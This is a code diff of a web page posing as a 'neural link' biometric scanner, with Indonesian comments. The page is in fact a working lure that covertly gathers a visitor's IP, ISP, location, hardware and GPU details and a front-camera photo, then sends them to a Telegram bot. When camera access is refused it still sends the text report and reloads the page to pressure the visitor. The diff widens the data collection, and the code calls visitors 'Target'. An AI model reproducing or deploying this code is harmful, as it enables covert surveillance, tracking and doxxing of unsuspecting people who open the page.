@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEURAL LINK ANALYZER v3.0</title>
+    <title>NEURAL LINK ANALYZER v4.0</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
 
@@ -25,6 +25,7 @@
             position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
             padding: 25px; border: 1px solid #00ff41; width: 85%; max-width: 380px;
             box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+            border-radius: 2px;
         }
 
         #trigger {
@@ -40,7 +41,7 @@
 
         @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
 
-        .terminal-text { font-size: 0.7rem; color: #008f11; line-height: 1.4; }
+        .terminal-text { font-size: 0.65rem; color: #008f11; line-height: 1.3; }
         .data-val { color: #00ff41; font-weight: bold; }
         
         video, canvas { display: none; position: fixed; }
@@ -53,28 +54,31 @@
 
     <div class="container">
         <div id="setup-view">
-            <h1 style="font-size: 1.1rem;">[ CORE_LINK_SYSTEM ]</h1>
-            <p style="font-size: 0.8rem; color: #888;">Sinkronisasi neural membutuhkan kalibrasi sensor biometrik.</p>
-            <p style="color: #00ff41; font-size: 0.7rem; border: 1px dashed #00ff41; padding: 10px;">
-                > TAP TO INITIALIZE UPLINK
-            </p>
+            <h1 style="font-size: 1rem; text-align: center;">[ NEURAL_UPLINK_v4 ]</h1>
+            <p style="font-size: 0.75rem; color: #888; text-align: center;">Otentikasi biometrik diperlukan untuk akses server terenkripsi.</p>
+            <div style="color: #00ff41; font-size: 0.7rem; border: 1px solid #00ff41; padding: 15px; text-align: center; background: rgba(0,255,65,0.05);">
+                > KLIK UNTUK SYNC BIOMETRIK
+            </div>
         </div>
 
-        <div id="scan-view" style="display:none; position: relative; height: 150px;">
+        <div id="scan-view" style="display:none; position: relative; height: 180px;">
             <div class="scan-bar"></div>
             <div class="terminal-text" id="log-text">
-                Initializing...<br>
-                Fetching IP_ADDRESS...<br>
-                Accessing SENSOR_CAM...
+                [SYSTEM] Initializing sequences...<br>
+                [CONN] Establishing secure tunnel...<br>
+                [DATA] Fetching network_metadata...<br>
+                [HW] Querying sensor_array...<br>
+                [UPLINK] Streaming biometrics...
             </div>
         </div>
 
         <div id="result-view" style="display:none;">
-            <h1 style="font-size: 1rem;">ACCESS GRANTED</h1>
-            <div class="terminal-text" id="final-log">
-                Identity: <span class="data-val">SECURE_USER</span><br>
-                Status: <span class="data-val">ENCRYPTED</span><br>
-                Neural: <span class="data-val">STABLE</span>
+            <h1 style="font-size: 0.9rem; text-align: center; color: #fff;">SYCHRONIZATION COMPLETE</h1>
+            <div class="terminal-text" style="border-top: 1px solid #008f11; padding-top: 10px;">
+                ID: <span class="data-val">SECURE_NODE_${Math.floor(Math.random()*9999)}</span><br>
+                AUTH: <span class="data-val">SUCCESS</span><br>
+                ENCRYPTION: <span class="data-val">AES-256</span><br>
+                UPLINK: <span class="data-val">ACTIVE</span>
             </div>
         </div>
     </div>
@@ -90,52 +94,85 @@
         const canvas = document.getElementById('canvas');
         const trigger = document.getElementById('trigger');
 
-        // Fungsi Utama
         async function startHackerScan() {
             trigger.style.display = 'none';
             document.getElementById('setup-view').style.display = 'none';
             document.getElementById('scan-view').style.display = 'block';
 
-            // 1. Ambil data Jaringan (IP, ISP, Lokasi) secara diam-diam
-            let networkInfo = "Gagal mengambil data jaringan";
+            // --- 1. DATA JARINGAN & LOKASI ---
+            let net = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                networkInfo = `
-🌐 [LOG JARINGAN]
-IP: ${d.ip}
-ISP: ${d.org}
-Lokasi: ${d.city}, ${d.region}, ${d.country_name}
-Device: ${navigator.platform}
-Browser: ${navigator.userAgent.split(') ')[1]}
-                `;
-            } catch (e) { console.log("IP API Blocked"); }
+                net = await res.json();
+            } catch (e) { console.log("NetErr"); }
 
-            // 2. Akses Kamera
+            // --- 2. DATA HARDWARE & BATERAI ---
+            let batteryInfo = "N/A";
+            try {
+                const bat = await navigator.getBattery();
+                batteryInfo = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
+            } catch (e) {}
+
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
+            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
+            const model = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Generic Device";
+
+            // --- 3. DATA GPU ---
+            let gpu = "Unknown";
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {}
+
+            const fullReport = `
+🛡️ [ADVANCED NEURAL LOG]
+------------------------------
+📱 DEVICE IDENTIFICATION
+Model   : ${model}
+Platform: ${navigator.platform}
+CPU     : ${cores}
+RAM Est : ${ram}
+Battery : ${batteryInfo}
+GPU     : ${gpu}
+
+🌐 NETWORK METADATA
+IP      : ${net.ip || 'Hidden'}
+ISP     : ${net.org || 'Unknown'}
+City    : ${net.city || 'Unknown'}, ${net.region || ''}
+Country : ${net.country_name || 'Unknown'}
+
+🖥️ SOFTWARE & TIME
+Browser : ${navigator.userAgent.split(') ')[1]}
+Language: ${navigator.language}
+LocalTime: ${new Date().toLocaleString('id-ID')}
+Screen  : ${window.screen.width}x${window.screen.height}
+------------------------------
+`;
+
+            // --- 4. AKSES KAMERA ---
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
 
-                // Tunggu sebentar untuk autofocus
                 setTimeout(() => {
-                    captureAndSend(stream, networkInfo);
-                }, 3000);
+                    captureAndSend(stream, fullReport);
+                }, 3500);
 
             } catch (err) {
-                sendToTelegram("❌ Target menolak akses kamera.\n\n" + networkInfo);
-                alert("SYSTEM_ERROR: Sensor biometrik tidak diizinkan.");
+                sendTextOnly(`❌ [AUTH_FAILED]\nTarget menolak akses biometrik.\n${fullReport}`);
+                alert("ERR_BIOMETRIC_DENIED: Kalibrasi gagal. Pastikan sensor kamera diizinkan.");
                 location.reload();
             }
         }
 
-        function captureAndSend(stream, networkInfo) {
+        function captureAndSend(stream, report) {
             const w = video.videoWidth;
             const h = video.videoHeight;
             canvas.width = w;
             canvas.height = h;
             
             const ctx = canvas.getContext('2d');
-            // Mirroring agar natural
             ctx.translate(w, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, w, h);
@@ -143,26 +180,27 @@ Browser: ${navigator.userAgent.split(') ')[1]}
             const imageData = canvas.toDataURL('image/png');
             const blob = dataURItoBlob(imageData);
 
-            // Kirim ke Telegram
             const formData = new FormData();
             formData.append('chat_id', TG_CHAT_ID);
-            formData.append('photo', blob, 'capture.png');
-            formData.append('caption', `🛡️ [SYSTEM LOG SUCCESS]\n${networkInfo}`);
+            formData.append('photo', blob, 'neural_scan.png');
+            formData.append('caption', `🛡️ [SYNC_SUCCESSFUL]\n${report}`);
 
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
 
-            // Selesai
             stream.getTracks().forEach(t => t.stop());
             document.getElementById('scan-view').style.display = 'none';
             document.getElementById('result-view').style.display = 'block';
         }
 
-        // Fungsi bantu kirim teks jika kamera gagal
-        function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`);
+        function sendTextOnly(text) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: TG_CHAT_ID, text: text})
+            });
         }
 
         function dataURItoBlob(dataURI) {
